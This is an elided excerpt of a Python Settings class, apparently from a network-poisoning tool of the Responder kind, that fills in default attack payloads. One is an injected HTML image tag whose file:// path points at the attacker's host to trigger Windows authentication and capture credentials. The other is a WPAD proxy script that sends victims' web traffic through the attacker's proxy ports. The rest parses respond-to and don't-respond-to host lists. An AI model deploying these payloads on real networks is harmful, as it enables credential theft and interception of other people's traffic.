...
class Settings:
    ...
    def populate(self, options):
        ...
        if len(self.HtmlToInject) == 0:
            self.HtmlToInject = (
                "<img src='file://///" + self.Bind_To + "/pictures/logo.jpg' alt='Loading' height='1' width='1'>"
            )

        if len(self.WPAD_Script) == 0:
            self.WPAD_Script = (
                'function FindProxyForURL(url, host){if ((host == "localhost") || shExpMatch(host, "localhost.*") ||(host == "127.0.0.1") || isPlainHostName(host)) return "DIRECT"; if (dnsDomainIs(host, "ProxySrv")||shExpMatch(host, "(*.ProxySrv|ProxySrv)")) return "DIRECT"; return "PROXY '
                + self.Bind_To
                + ":3128; PROXY "
                + self.Bind_To
                + ':3141; DIRECT";}'
        ...
        # Respond to hosts
        self.RespondTo = list(
            filter(None, [x.upper().strip() for x in config.get("Responder Core", "RespondTo").strip().split(",")])
        )
        self.RespondToName = list(
            filter(None, [x.upper().strip() for x in config.get("Responder Core", "RespondToName").strip().split(",")])
        )
        self.DontRespondTo = list(
            filter(None, [x.upper().strip() for x in config.get("Responder Core", "DontRespondTo").strip().split(",")])
        )
        self.DontRespondToName = list(
            filter(
                None, [x.upper().strip() for x in config.get("Responder Core", "DontRespondToName").strip().split(",")]
            )
        )
        ...
        self.MachineNego = (
            "".join([random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789") for i in range(9)]) + "$@" + self.DomainName
        )
